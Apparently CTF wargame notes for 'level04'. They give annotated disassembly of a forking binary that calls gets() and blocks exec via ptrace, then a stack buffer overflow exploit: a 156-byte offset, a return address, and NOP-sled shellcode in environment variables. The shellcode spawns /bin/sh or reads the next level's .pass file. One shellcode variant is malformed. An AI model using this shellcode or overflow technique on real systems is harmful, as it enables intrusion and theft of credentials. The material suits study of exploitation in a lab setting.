stack :

esp : ebp - 0xb0
?
0x1c - 0x20 : status
0x20 - 0xa0 : buffer
0xa0 - 0xa4 : status2
0xa4 - 0xa8 : status3
0xa8 - 0xac : i
0xac - 0xb0 : pid
ebp

main:
0x080486c8 <+0>:	push   %ebp
0x080486c9 <+1>:	mov    %esp,%ebp
0x080486cb <+3>:	push   %edi
0x080486cc <+4>:	push   %ebx
0x080486cd <+5>:	and    $0xfffffff0,%esp
0x080486d0 <+8>:	sub    $0xb0,%esp ; 176

0x080486d6 <+14>:	call   0x8048550 <fork@plt>

0x080486db <+19>:	mov    %eax,0xac(%esp) ; pid = fork();

0x080486e2 <+26>:	lea    0x20(%esp),%ebx
0x080486e6 <+30>:	mov    $0x0,%eax
0x080486eb <+35>:	mov    $0x20,%edx
0x080486f0 <+40>:	mov    %ebx,%edi
0x080486f2 <+42>:	mov    %edx,%ecx
0x080486f4 <+44>:	rep stos %eax,%es:(%edi) ; memset(buffer, '\0', 128);
0x080486f6 <+46>:	movl   $0x0,0xa8(%esp) ; i = 0
0x08048701 <+57>:	movl   $0x0,0x1c(%esp) ; status = 0
0x08048709 <+65>:	cmpl   $0x0,0xac(%esp)
0x08048711 <+73>:	jne    0x8048769 <main+161>

if (pid == 0) ; le fils
	0x08048713 <+75>:	movl   $0x1,0x4(%esp)
	0x0804871b <+83>:	movl   $0x1,(%esp)
	0x08048722 <+90>:	call   0x8048540 <prctl@plt> ; prctl(PR_SET_PDEATHSIG, 1)
	0x08048727 <+95>:	movl   $0x0,0xc(%esp)
	0x0804872f <+103>:	movl   $0x0,0x8(%esp)
	0x08048737 <+111>:	movl   $0x0,0x4(%esp)
	0x0804873f <+119>:	movl   $0x0,(%esp)
	0x08048746 <+126>:	call   0x8048570 <ptrace@plt> ; ptrace(PTRACE_TRACEME, 0, 0, 0)
	0x0804874b <+131>:	movl   $0x8048903,(%esp)
	0x08048752 <+138>:	call   0x8048500 <puts@plt> ; puts("Give me some shellcode, k");

	0x08048757 <+143>:	lea    0x20(%esp),%eax
	0x0804875b <+147>:	mov    %eax,(%esp)
	0x0804875e <+150>:	call   0x80484b0 <gets@plt> ; gets(buffer)
	0x08048763 <+155>:	jmp    0x804881a <main+338>
else ; le parent
0x08048768 <+160>:	nop
0x08048769 <+161>:	lea    0x1c(%esp),%eax ; status
0x0804876d <+165>:	mov    %eax,(%esp)
0x08048770 <+168>:	call   0x80484f0 <wait@plt> ; wait(&status)
0x08048775 <+173>:	mov    0x1c(%esp),%eax ; eax = status
0x08048779 <+177>:	mov    %eax,0xa0(%esp) ; status2 = eax
0x08048780 <+184>:	mov    0xa0(%esp),%eax ; eax = status2
0x08048787 <+191>:	and    $0x7f,%eax ; eax = WSTATUS(status2)
0x0804878a <+194>:	test   %eax,%eax
0x0804878c <+196>:	je     0x80487ac <main+228>

; if (!WIFEXITED())
	0x0804878e <+198>:	mov    0x1c(%esp),%eax ; eax = status
	0x08048792 <+202>:	mov    %eax,0xa4(%esp) ; status3 = eax
	0x08048799 <+209>:	mov    0xa4(%esp),%eax ; eax = status3
	0x080487a0 <+216>:	and    $0x7f,%eax ; eax = WSTATUS(status3)
	0x080487a3 <+219>:	add    $0x1,%eax ; eax = WSTATUS(status3) + 1
	0x080487a6 <+222>:	sar    %al ; eax = WSTATUS(status3) + 1 >> 1 /!\ bitshift preserve sign
	0x080487a8 <+224>:	test   %al,%al
	0x080487aa <+226>:	jle    0x80487ba <main+242> ; on fait un truc.

else
	0x080487ac <+228>:	movl   $0x804891d,(%esp)
	0x080487b3 <+235>:	call   0x8048500 <puts@plt> ; puts("child is exiting...")
	0x080487b8 <+240>:	jmp    0x804881a <main+338>

0x080487ba <+242>:	movl   $0x0,0xc(%esp)
0x080487c2 <+250>:	movl   $0x2c,0x8(%esp)
0x080487ca <+258>:	mov    0xac(%esp),%eax
0x080487d1 <+265>:	mov    %eax,0x4(%esp)
0x080487d5 <+269>:	movl   $0x3,(%esp)
0x080487dc <+276>:	call   0x8048570 <ptrace@plt> ; ptrace(PTRACE_PEEKUSER, pid, 0x2c, 0)
0x080487e1 <+281>:	mov    %eax,0xa8(%esp) ; i = eax;
0x080487e8 <+288>:	cmpl   $0xb,0xa8(%esp) ;
0x080487f0 <+296>:	jne    0x8048768 <main+160>
0x080487f6 <+302>:	movl   $0x8048931,(%esp)
0x080487fd <+309>:	call   0x8048500 <puts@plt> ; puts("no exec() for you")
0x08048802 <+314>:	movl   $0x9,0x4(%esp)
0x0804880a <+322>:	mov    0xac(%esp),%eax
0x08048811 <+329>:	mov    %eax,(%esp)
0x08048814 <+332>:	call   0x8048520 <kill@plt>
0x08048819 <+337>:	nop
0x0804881a <+338>:	mov    $0x0,%eax
0x0804881f <+343>:	lea    -0x8(%ebp),%esp
0x08048822 <+346>:	pop    %ebx
0x08048823 <+347>:	pop    %edi
0x08048824 <+348>:	pop    %ebp
0x08048825 <+349>:	ret

gdb /home/users/level04/level04 -ex "set args < <(python -c \"print 'a' * 6000\")"

buffer : 0xffffd690

ebp : 0xffffd728
rip : 0xffffd72c

0x9c * 'a' + adresse du shellcode
gdb /home/users/level04/level04 -ex "set args < <(python -c \"print 'a' * 156 + '\xdc''\xbf''\xff''\xff' \")"
export BINSH=`python -c "print '\x90' * 10000 + '\x31''\xc0''\x50''\x68''\x2f''\x2f''\x73''\x68''\x68''\x2f''\x62''\x69''\x6e''\x89''\xe3''\x89''\xc1''\x89''\xc2''\xb0''\x0b''\xcd''\x80''\x31''\xc0''\x40''\xcd''\x80'"`
shellcode : 0xffffbfdc

/home/users/level04/level04 <(python -c "print 'a' * 156 + '\xdc''\xbf''\xff''\xff' ")

export BINSH=`python -c "print '\x90' * 10000 + "'\xeb''\x3f''\xb8''\x05''\x00''\x00''\x00''\x5b''\xb9''\x00''\x00''\x00''\x00''\xba''\xff''\x01''\x00''\x00''\xcd''\x80''\xb9''\xdc''\xbf''\xff''\xff''\x89''\xc3''\xb8''\x03''\x00''\x00''\x00''\xba''\x29''\x00''\x00''\x00''\xcd''\x80''\x89''\xc2''\xb8''\x04''\x00''\x00''\x00''\xbb''\x01''\x00''\x00''\x00''\xcd''\x80''\xbb''\x00''\x00''\x00''\x00''\xb8''\x01''\x00''\x00''\x00''\xcd''\x80''\xe8''\xbc''\xff''\xff''\xff''\x2f''\x74''\x6d''\x70''\x2f''\x61'"`


export BINSH=`python -c "print '\x90' * 10000 + 'eb''\x23''\xb8''\x05''\x00''\x00''\x00''\x5b''\xb9''\x00''\x00''\x00''\x00''\xba''\xff''\x01''\x00''\x00''\xcd''\x80''\xb9''\xdc''\xbf''\xff''\xff''\x89''\xc3''\xb8''\x03''\x00''\x00''\x00''\xba''\x29''\x00''\x00''\x00''\xcd''\x80''\x89''\xc2''\xb8''\x04''\x00''\x00''\x00''\xbb''\x01''\x00''\x00''\x00''\xcd''\x80''\xbb''\x00''\x00''\x00''\x00''\xb8''\x01''\x00''\x00''\x00''\xcd''\x80''\xe8''\xd8''\xff''\xff''\xff''\x2f''\x74''\x6d''\x70''\x2f''\x61'

export BINSH=`python -c "print '\x90' * 10000 + '\xeb''\x3f''\xb8''\x05''\x00''\x00''\x00''\x5b''\xb9''\x00''\x00''\x00''\x00''\xba''\xff''\x01''\x00''\x00''\xcd''\x80''\xb9''\xdc''\xbf''\xff''\xff''\x89''\xc3''\xb8''\x03''\x00''\x00''\x00''\xba''\x29''\x00''\x00''\x00''\xcd''\x80''\x89''\xc2''\xb8''\x04''\x00''\x00''\x00''\xbb''\x01''\x00''\x00''\x00''\xcd''\x80''\xbb''\x00''\x00''\x00''\x00''\xb8''\x01''\x00''\x00''\x00''\xcd''\x80''\xe8''\xbc''\xff''\xff''\xff''\x2f''\x74''\x6d''\x70''\x2f''\x61'"`

export BINSH=`python -c "print '\x90' * 10000 + '\xeb''\x2d''\x31''\xc0''\xb0''\x05''\x5b''\x31''\xc9''\x31''\xd2''\x66''\xba''\xff''\x01''\xcd''\x80''\xb9''\xdc''\xbf''\xff''\xff''\x89''\xc3''\x31''\xc0''\xb0''\x03''\x31''\xd2''\xb2''\x29''\xcd''\x80''\x89''\xc2''\x31''\xc0''\xb0''\x04''\x31''\xdb''\xb3''\x01''\xcd''\x80''\xc3''\xe8''\xce''\xff''\xff''\xff''\x2f''\x74''\x6d''\x70''\x2f''\x61'"`

export BINSH=`python -c "print'\x90' * 10000 + '\xeb''\x2d''\x31''\xc0''\xb0''\x05''\x5b''\x31''\xc9''\x31''\xd2''\x66''\xba''\xff''\x01''\xcd''\x80''\xb9''\xdc''\xbf''\xff''\xff''\x89''\xc3''\x31''\xc0''\xb0''\x03''\x31''\xd2''\xb2''\x29''\xcd''\x80''\x89''\xc2''\x31''\xc0''\xb0''\x04''\x31''\xdb''\xb3''\x01''\xcd''\x80''\xc3''\xe8''\xce''\xff''\xff''\xff''\x2f''\x68''\x6f''\x6d''\x65''\x2f''\x75''\x73''\x65''\x72''\x73''\x2f''\x6c''\x65''\x76''\x65''\x6c''\x30''\x35''\x2f''\x2e''\x70''\x61''\x73''\x73'"`
